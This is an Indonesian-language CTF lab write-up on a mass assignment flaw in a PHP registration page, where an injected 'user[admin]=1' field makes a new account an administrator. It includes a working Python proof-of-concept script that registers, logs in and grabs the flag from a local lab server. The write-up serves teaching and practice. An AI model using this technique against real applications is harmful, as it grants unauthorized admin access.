---
title: Jadi Admin
description: Writeup lab Jadi Admin
tags:
  - access control
  - mass assignment
  - privilege escalation
  - CTF
draft: false
---

## Summary
* Vuln Name: Mass Assignment
* Type: Broken access control
* Impact: Privilege Escalation
* Severity: High
* functionality: [[registration]], [[database]]

## Metodologi dan Observasi
1. Pada aplikasi ini, terdapat fungsionalitas [[registration]] pengguna baru di `register.php`.
2. Saat form dikirim, input pengguna diterima sebagai *array* bernama `user` (contoh: `user[username]` dan `user[password]`).
3. Aplikasi melakukan iterasi `foreach` atas seluruh isi *array* `user` tersebut dan *langsung* memasukkan kuncinya (*keys*) sebagai nama kolom ke dalam _query_ `INSERT` pada [[database]].
4. Pengembang tidak melakukan *whitelisting* atau penyaringan terhadap parameter apa saja yang boleh dimasukkan oleh pengguna.
5. Jika pengguna dengan sengaja menyertakan input tambahan seperti `user[admin]=1` (atau nama kolom lain yang mewakili hak akses istimewa, bergantung skema *database*), sistem akan menerimanya dan membuat pengguna tersebut menjadi admin.
6. Kerentanan ini dikenal luas sebagai [[mass-assignment]].

## PoC
Kita dapat menyisipkan instrumen tambahan saat mengirim form registrasi dengan *tool* seperti Burp Suite, cURL, atau *script* otomatis.

```python
import requests
import re

url = "http://localhost:1337"
s = requests.Session()

# 1. Mendaftar dengan menyisipkan parameter 'admin' ke dalam array 'user'
data = {
    "user[username]": "hacker",
    "user[password]": "hacked",
    "user[admin]": "1" # Mengeksploitasi Mass Assignment
}
s.post(f"{url}/register.php", data=data)

# 2. Login dengan akun yang baru dibuat
s.post(f"{url}/auth.php", data={
    "username": "hacker",
    "password": "hacked"
})

# 3. Mengakses dashboard admin dan mendapatkan flag
res = s.get(f"{url}/admin.php")
if "Administrative Access Granted" in res.text:
    flag = re.search(r'pwn\{.*?\}', res.text).group(0)
    print(f"[+] Flag found: {flag}")
```

## Impact
Kerentanan ini memungkinkan pengguna biasa melakukan [[privilege-escalation]] dengan seketika mendapatkan akses teratas (Admin) tanpa otorisasi.
